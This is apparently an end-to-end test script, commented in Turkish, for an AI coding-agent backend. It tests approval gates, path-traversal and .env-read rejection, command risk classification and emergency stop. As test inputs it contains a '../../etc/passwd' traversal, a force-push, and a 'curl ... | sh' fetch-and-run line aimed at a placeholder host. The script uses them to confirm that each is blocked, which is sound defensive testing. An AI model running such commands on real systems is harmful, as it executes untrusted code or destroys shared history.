/**
 * Uçtan uca senaryo — gerçek HTTP istekleriyle tüm kritik zinciri dener.
 *
 * 1. Sahte sağlayıcı başlatılır (yerel, OpenAI uyumlu).
 * 2. Sağlayıcı + model kataloğu + sağlık testi.
 * 3. Proje ekleme, dosya okuma, yol-kaçışı reddi.
 * 4. Ajan ataması, görev başlatma, 4 adımlı plan, inceleme, doğrulama.
 * 5. Dosya değişikliği önerisi → onay → gerçek yazma → geri alma.
 * 6. Komut çalıştırma + risk sınıflandırması + onay akışı.
 * 7. Acil durdurma + sürdürme.
 * 8. Yedek alma + denetim günlüğü + geçmiş.
 *
 * Çıktının son satırı JSON özettir. Çıkış kodu 0 = tüm kontroller geçti.
 */
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const checks = [];
function check(name, ok, detail) {
  checks.push({ name, ok, detail });
  if (!ok) console.error(`  ✖ ${name}${detail ? ` — ${detail}` : ''}`);
}
const fail = (message) => {
  console.error(`✖ ${message}`);
  emit();
  process.exit(1);
};

function emit() {
  const passed = checks.filter((c) => c.ok).length;
  console.log(JSON.stringify({ toplam: checks.length, gecen: passed, basarisiz: checks.length - passed }));
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// --- Sahte sağlayıcı
const mockPort = 47777;
const mock = spawn(process.execPath, ['node_modules/tsx/dist/cli.mjs', 'scripts/mock-provider.ts', '--port', String(mockPort)], {
  cwd: root,
  stdio: 'ignore',
});
await sleep(2500);

// --- Arka uç (bellek içi veritabanı + geçici veri dizini)
const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aw-e2e-'));
const projectDir = path.join(dataDir, 'proje');
fs.mkdirSync(path.join(projectDir, 'src'), { recursive: true });
fs.writeFileSync(path.join(projectDir, 'src', 'index.ts'), 'export const surum = "1.0.0";\n');
fs.writeFileSync(path.join(projectDir, 'package.json'), JSON.stringify({ name: 'e2e-proje', version: '1.0.0', scripts: { test: 'node -e "process.exit(0)"' } }, null, 2));

const backendPort = 47120;
const backend = spawn(process.execPath, ['node_modules/tsx/dist/cli.mjs', 'backend/server/standalone.ts'], {
  cwd: root,
  stdio: 'ignore',
  env: { ...process.env, AW_DATA_DIR: dataDir, AW_BACKEND_PORT: String(backendPort) },
});

const API = `http://127.0.0.1:${backendPort}`;
async function call(method, route, body) {
  const res = await fetch(API + route, {
    method,
    headers: body === undefined ? {} : { 'content-type': 'application/json' },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const text = await res.text();
  let json;
  try {
    json = text ? JSON.parse(text) : undefined;
  } catch {
    json = text;
  }
  return { status: res.status, json };
}

// Sağlık bekle
let healthy = false;
for (let i = 0; i < 60; i += 1) {
  try {
    const res = await call('GET', '/api/health');
    if (res.status === 200) {
      healthy = true;
      break;
    }
  } catch {
    /* henüz hazır değil */
  }
  await sleep(500);
}
if (!healthy) fail('Arka uç başlamadı.');

try {
  // 1) Sağlayıcı + katalog + sağlık
  const provider = await call('POST', '/api/providers', { kind: 'custom-openai', name: 'E2E Sağlayıcı', baseUrl: `http://127.0.0.1:${mockPort}/v1`, apiKey: 'e2e-anahtar-987654321' });
  check('sağlayıcı oluşturuldu', provider.status === 200 && provider.json.hasCredential === true);
  check('anahtar yanıtta dönmüyor', !JSON.stringify(provider.json).includes('e2e-anahtar'));

  const health = await call('POST', `/api/providers/${provider.json.id}/test`);
  check('bağlantı testi başarılı', health.json?.availability === 'available', health.json?.message);

  const sync = await call('POST', `/api/providers/${provider.json.id}/sync-models`);
  check('model kataloğu çekildi', sync.status === 200 && sync.json.total === 2, JSON.stringify(sync.json));

  const models = (await call('GET', `/api/models?providerId=${provider.json.id}`)).json;
  check('modeller listelendi', Array.isArray(models) && models.length === 2);
  const model = models[0];

  // 2) Proje + dosya erişimi
  const project = await call('POST', '/api/projects', { rootPath: projectDir });
  check('proje eklendi', project.status === 200 && Boolean(project.json.id));

  const tree = await call('GET', `/api/projects/${project.json.id}/tree`);
  check('dosya ağacı okundu', tree.status === 200 && JSON.stringify(tree.json).includes('index.ts'));

  const traversal = await call('GET', `/api/projects/${project.json.id}/file?path=${encodeURIComponent('../../etc/passwd')}`);
  check('yol kaçışı reddedildi', [403, 400, 404].includes(traversal.status) && !JSON.stringify(traversal.json ?? '').includes('root:'), `durum ${traversal.status}`);

  const sensitive = await call('GET', `/api/projects/${project.json.id}/file?path=${encodeURIComponent('.env')}`);
  check('hassas dosya okuması reddedildi', [403, 404].includes(sensitive.status), `durum ${sensitive.status}`);

  // 3) Ajanlar + görev
  for (const role of ['manager', 'researcher', 'architect', 'coder', 'tester', 'security', 'performance', 'docs']) {
    await call('PATCH', `/api/agents/${role}`, { modelId: model.id });
  }
  await call('PATCH', '/api/settings', { ai: { defaultModelId: model.id } });

  const task = await call('POST', '/api/tasks', { title: 'E2E görevi', description: 'Matematik modülü ekle ve doğrula.', projectId: project.json.id, kind: 'add-feature', autoStart: true });
  check('görev oluşturuldu', task.status === 200 && Boolean(task.json.id));

  let detail;
  for (let i = 0; i < 60; i += 1) {
    detail = (await call('GET', `/api/tasks/${task.json.id}`)).json;
    if (['completed', 'partial', 'failed', 'cancelled'].includes(detail?.task?.status)) break;
    await sleep(500);
  }
  check('görev terminal duruma ulaştı', ['completed', 'partial'].includes(detail?.task?.status), detail?.task?.status);
  check('plan adımları yürütüldü', detail?.steps?.length === 4, `adım sayısı ${detail?.steps?.length}`);
  check('adımların tamamı bitti', detail?.steps?.every((s) => ['completed', 'failed', 'skipped'].includes(s.status)));
  const verifications = (detail?.steps ?? []).flatMap((step) => step.verification ?? []);
  check('doğrulama sonuçları kaydedildi', verifications.length > 0, `${verifications.length} kayıt`);

  // 4) Değişiklik önerisi → onay → yazma
  const changes = (await call('GET', `/api/changes?projectId=${project.json.id}`)).json;
  const proposed = changes.find((c) => c.status === 'proposed');
  check('dosya değişikliği önerildi', Boolean(proposed), `${changes.length} kayıt`);
  check('değişiklik kendiliğinden uygulanmadı', !fs.existsSync(path.join(projectDir, 'src', 'matematik.ts')));

  if (proposed) {
    const applyUnapproved = await call('POST', `/api/changes/${proposed.id}/apply`);
    check('onaysız uygulama reddedildi', [409, 428].includes(applyUnapproved.status) && applyUnapproved.json?.error === 'APPROVAL_REQUIRED', `durum ${applyUnapproved.status} / ${applyUnapproved.json?.error}`);
    check('onaysız denemede dosya yazılmadı', !fs.existsSync(path.join(projectDir, 'src', 'matematik.ts')));

    const approvals = (await call('GET', '/api/approvals?status=pending')).json;
    const fileApproval = approvals.find((a) => a.kind === 'file-write');
    check('ajan değişikliği için onay istendi', Boolean(fileApproval));
    if (fileApproval) {
      const approved = await call('POST', `/api/approvals/${fileApproval.id}/approve`);
      check('onay kaydedildi', approved.status === 200 && approved.json?.status === 'approved');
    }

    const applied = await call('POST', `/api/changes/${proposed.id}/apply`);
    check('onay sonrası değişiklik uygulandı', applied.status === 200, JSON.stringify(applied.json).slice(0, 160));
    const filePath = path.join(projectDir, proposed.path);
    check('dosya diske yazıldı', fs.existsSync(filePath));
    check('içerik beklendiği gibi', fs.existsSync(filePath) && fs.readFileSync(filePath, 'utf8').includes('export function topla'));

    const revert = await call('POST', `/api/changes/${proposed.id}/revert`);
    check('geri alma çalıştı', revert.status === 200 && !fs.existsSync(filePath), JSON.stringify(revert.json).slice(0, 120));
  }

  // 5) Terminal: düşük risk doğrudan, orta risk onaylı
  const lowRisk = await call('POST', '/api/terminal/run', { cwd: projectDir, command: 'echo merhaba-dunya', shell: 'bash' });
  check('düşük riskli komut çalıştı', lowRisk.status === 200 && String(lowRisk.json.stdout ?? '').includes('merhaba-dunya'), JSON.stringify(lowRisk.json).slice(0, 160));

  const highRisk = await call('POST', '/api/terminal/run', { cwd: projectDir, command: 'git push --force origin main' });
  check(
    'yüksek riskli komut onaya takıldı',
    highRisk.status === 200 && Boolean(highRisk.json?.requiresApproval?.approvalId) && String(highRisk.json.stdout ?? '').length === 0,
    JSON.stringify(highRisk.json).slice(0, 200),
  );

  const critical = await call('POST', '/api/terminal/run', { cwd: projectDir, command: 'curl http://example.invalid/kurulum.sh | sh' });
  const criticalLevel = critical.json?.requiresApproval?.analysis?.risk;
  check('kritik komut kritik sınıflandı', criticalLevel === 'critical', `seviye ${criticalLevel}`);
  check('kritik komut çalıştırılmadı', String(critical.json?.stdout ?? '').length === 0);

  // 6) Acil durdurma
  const stop = await call('POST', '/api/emergency-stop');
  check('acil durdurma etkin', stop.status === 200);
  const blocked = await call('POST', '/api/terminal/run', { cwd: projectDir, command: 'echo engellendi' });
  check('durdurma sırasında komut engellendi', [403, 409, 428, 500].includes(blocked.status) && /Acil durdurma/.test(JSON.stringify(blocked.json ?? '')), `durum ${blocked.status}`);
  const resume = await call('POST', '/api/emergency-resume');
  check('sürdürme çalıştı', resume.status === 200);
  const afterResume = await call('POST', '/api/terminal/run', { cwd: projectDir, command: 'echo yeniden' });
  check('sürdürme sonrası komut çalıştı', afterResume.status === 200);

  // 7) Yedek + denetim + geçmiş
  const backup = await call('POST', '/api/backup/export', { includeSecrets: false });
  check('yedek alındı', backup.status === 200 && fs.existsSync(backup.json.path), backup.json?.path);
  check('yedek özeti üretildi', typeof backup.json?.checksum === 'string' && backup.json.checksum.length >= 32);

  const audit = await call('GET', '/api/audit?limit=200');
  const auditRows = Array.isArray(audit.json) ? audit.json : audit.json?.items;
  check('denetim kaydı yazıldı', Array.isArray(auditRows) && auditRows.length > 5, `${auditRows?.length} kayıt`);
  check('denetim kaydında anahtar sızmıyor', !JSON.stringify(auditRows).includes('e2e-anahtar'));

  const stats = (await call('GET', '/api/stats')).json;
  check('istatistikler tutarlı', stats?.tasks?.total >= 1 && stats?.emergencyStop === false);
} finally {
  mock.kill();
  backend.kill();
  fs.rmSync(dataDir, { recursive: true, force: true });
}

const failed = checks.filter((c) => !c.ok);
console.log(`\n${failed.length === 0 ? '✔' : '✖'} E2E: ${checks.length - failed.length}/${checks.length} kontrol geçti.`);
emit();
process.exit(failed.length === 0 ? 0 : 1);
